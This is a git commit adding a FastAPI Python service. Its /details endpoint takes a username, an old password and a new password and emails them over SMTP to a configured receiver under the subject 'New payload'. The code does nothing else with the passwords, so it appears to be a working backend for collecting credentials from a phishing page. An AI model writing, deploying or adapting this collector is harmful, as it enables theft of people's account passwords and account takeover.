20d4ba4c8be98ba92d299b22b25acbf453cc536d
vaibhav0712 <saneparavaibhav73@gmail.com>
2025-05-16 19:40:44 +0530

    first

---
+++ main.py
@@ -0,0 +1,44 @@
+from fastapi import FastAPI, HTTPException
+import smtplib
+from email.mime.text import MIMEText
+from dotenv import load_dotenv
+import os
+
+load_dotenv()
+app = FastAPI()
+
+SENDER = os.getenv("SENDER")
+RECIVER = os.getenv("RECIVER")
+PASSWORD = os.getenv("PASSWORD")
+SMTP_SERVER = os.getenv("SMTP_SERVER")
+SMTP_PORT = os.getenv("SMTP_PORT")
+
+
+@app.get("/")
+def home():
+    return "<h1>Root</h1>"
+
+
+@app.post("/details")
+def get_details(old_password: str, new_password: str, username: str = None):
+    # Assume that the payload will follow rules
+    # send email containing details
+    send_email(old_password, new_password, username)
+    return {"message": "email has been sent successfully"}
+
+
+def send_email(old_password, new_password, username=None):
+    msg = MIMEText(
+        f"New details has recived. \n old password : {old_password}. \n new password : {new_password}. "
+    )
+    msg["Subject"] = "New payload"
+    msg["From"] = SENDER
+    msg["To"] = RECIVER
+
+    try:
+        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+            server.starttls()
+            server.login(SENDER, PASSWORD)
+            server.send_message(msg)
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Failed to send data: {str(e)}")
